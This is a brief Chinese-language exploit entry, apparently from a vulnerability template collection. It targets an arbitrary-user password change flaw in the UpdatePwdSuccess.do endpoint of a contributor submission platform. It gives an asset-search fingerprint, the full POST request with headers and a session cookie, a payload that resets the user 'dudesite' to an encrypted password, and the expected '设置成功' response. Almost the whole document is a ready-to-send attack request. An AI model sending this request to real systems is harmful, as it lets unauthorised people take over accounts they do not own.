# 畅享通讯员投稿平台UpdatePwdSuccess.do任意用户密码修改漏洞

- **系统**：畅享通讯员投稿平台UpdatePwdSuccess.do任意用户密码修改　|　**类型**：其他　|　**CVE**：—
- **指纹**：`app="FOUNDER-全媒体采编系统"`
- **请求**：`POST /newsedit/newsedit/batman/UpdatePwdSuccess.do HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Cookie: BMSearchType=1; JSESSIONID=235CA033F1BBC7845267FE2C0B493E09`

**请求体 / payload**
```
userCode=dudesite&encrypttools=rsa&BM_PWD=613652a38e9861f3affb5b299b15ee174cda42ac0539605eca5677c04e68a46c47c1c350a16d19ac5b0244380aba1174167e2321cb32f97f8a10308be519de86072c4bbba980de9e2e56a9bdf91752fbafa73f5da10fbd4395c981f19c4030adad99eb71bcebae204040ac31680a63a9b2bfa26eb0f14545e16a13e82eb86d15&CHECK_PASSWORD=613652a38e9861f3affb5b299b15ee174cda42ac0539605eca5677c04e68a46c47c1c350a16d19ac5b0244380aba1174167e2321cb32f97f8a10308be519de86072c4bbba980de9e2e56a9bdf91752fbafa73f5da10fbd4395c981f19c4030adad99eb71bcebae204040ac31680a63a9b2bfa26eb0f14545e16a13e82eb86d15
```
- **预期**：200　|　设置成功